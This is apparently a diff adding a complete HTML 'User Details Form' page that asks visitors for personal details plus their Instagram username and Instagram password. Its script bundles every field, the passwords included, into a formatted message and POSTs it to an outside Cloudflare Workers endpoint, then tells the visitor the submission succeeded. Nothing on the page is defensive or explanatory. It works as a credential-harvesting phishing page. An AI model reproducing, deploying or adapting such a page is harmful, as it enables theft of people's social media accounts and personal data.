@@ -1,1 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Information Submission Form</title>
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+    body {
+        font-family: system-ui, -apple-system, sans-serif;
+        background-color: #0f172a;
+        color: #f8fafc;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+    }
+    .form-card {
+        background-color: #1e293b;
+        border: 1px solid #334155;
+        border-radius: 12px;
+        padding: 28px;
+        width: 100%;
+        max-width: 480px;
+        box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+    }
+    h2 {
+        margin-bottom: 20px;
+        color: #38bdf8;
+        font-size: 22px;
+        text-align: center;
+    }
+    .form-group {
+        margin-bottom: 14px;
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+    }
+    label {
+        font-size: 13px;
+        font-weight: 600;
+        color: #cbd5e1;
+    }
+    input, select, textarea {
+        background-color: #0f172a;
+        border: 1px solid #475569;
+        border-radius: 6px;
+        padding: 10px 12px;
+        color: #f8fafc;
+        font-size: 14px;
+        outline: none;
+        transition: border-color 0.2s;
+    }
+    input:focus, select:focus, textarea:focus {
+        border-color: #38bdf8;
+    }
+    textarea {
+        resize: vertical;
+        min-height: 70px;
+    }
+    button {
+        width: 100%;
+        background-color: #38bdf8;
+        color: #0f172a;
+        font-weight: 700;
+        border: none;
+        border-radius: 6px;
+        padding: 12px;
+        font-size: 15px;
+        cursor: pointer;
+        margin-top: 10px;
+        transition: background-color 0.2s;
+    }
+    button:hover {
+        background-color: #7dd3fc;
+    }
+    button:disabled {
+        background-color: #64748b;
+        cursor: not-allowed;
+    }
+    #status {
+        margin-top: 14px;
+        font-size: 13px;
+        text-align: center;
+        min-height: 18px;
+    }
+    .success { color: #4ade80; }
+    .error { color: #f87171; }
+</style>
+</head>
+<body>
+
+<div class="form-card">
+    <h2>User Details Form</h2>
+    <form id="detailsForm">
+        <div class="form-group">
+            <label for="name">Name</label>
+            <input type="text" id="name" required placeholder="Enter full name">
+        </div>
+
+        <div class="form-group">
+            <label for="age">Age</label>
+            <input type="number" id="age" min="1" max="120" required placeholder="Enter age">
+        </div>
+
+        <div class="form-group">
+            <label for="gender">Gender</label>
+            <select id="gender" required>
+                <option value="" disabled selected>Select gender</option>
+                <option value="Male">Male</option>
+                <option value="Female">Female</option>
+                <option value="Other">Other</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="address">Address</label>
+            <textarea id="address" required placeholder="Enter full address"></textarea>
+        </div>
+
+        <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" required placeholder="name@example.com">
+        </div>
+
+        <div class="form-group">
+            <label for="input1">Password</label>
+            <input type="password" id="input1" placeholder="Password">
+        </div>
+
+        <div class="form-group">
+            <label for="input2">Intagram Id</label>
+            <input type="text" id="input2" placeholder="Intagram Id">
+        </div>
+
+        <div class="form-group">
+            <label for="input3">Insta Password</label>
+            <input type="text" id="input3" placeholder="Password">
+        </div>
+                <div class="form-group">
+            <label for="input4">Mobile</label>
+            <input type="tel" id="input4" placeholder="Mobile">
+        </div>
+
+        <button type="submit" id="submitBtn">Submit</button>
+        <div id="status"></div>
+    </form>
+</div>
+
+<script>
+const PROXY_URL = "https://snowy-wood-6257.piyankar2008.workers.dev";
+
+document.getElementById("detailsForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const submitBtn = document.getElementById("submitBtn");
+    const statusDiv = document.getElementById("status");
+
+    submitBtn.disabled = true;
+    statusDiv.className = "";
+    statusDiv.textContent = "Sending submission...";
+
+    const name = document.getElementById("name").value.trim();
+    const age = document.getElementById("age").value.trim();
+    const gender = document.getElementById("gender").value;
+    const address = document.getElementById("address").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const input1 = document.getElementById("input1").value.trim() || "N/A";
+    const input2 = document.getElementById("input2").value.trim() || "N/A";
+    const input3 = document.getElementById("input3").value.trim() || "N/A";
+    const input4 = document.getElementById("input4").value.trim() || "N/A";
+
+    const message = `📋 *NEW FORM SUBMISSION*
+━━━━━━━━━━━━━━━━━━
+👤 *Name:* ${name}
+🎂 *Age:* ${age}
+⚧ *Gender:* ${gender}
+🏠 *Address:* ${address}
+📧 *Email:* \`${email}\`
+• *Password* ${input1}
+• *IntagramId* ${input2}
+• *Intagram Password* ${input3}
+• *Mobile* ${input4}
+━━━━━━━━━━━━━━━━━━
+🕒 *Submitted:* ${new Date().toLocaleString()}`;
+
+    try {
+        const response = await fetch(PROXY_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ message: message })
+        });
+
+        if (response.ok) {
+            statusDiv.className = "success";
+            statusDiv.textContent = "✓ Form successfully submitted!";
+            document.getElementById("detailsForm").reset();
+        } else {
+            throw new Error("Worker returned an error");
+        }
+    } catch (err) {
+        statusDiv.className = "error";
+        statusDiv.textContent = "❌ Failed to send data. Please try again.";
+    } finally {
+        submitBtn.disabled = false;
+    }
+});
+</script>
+
+</body>
+</html>
 
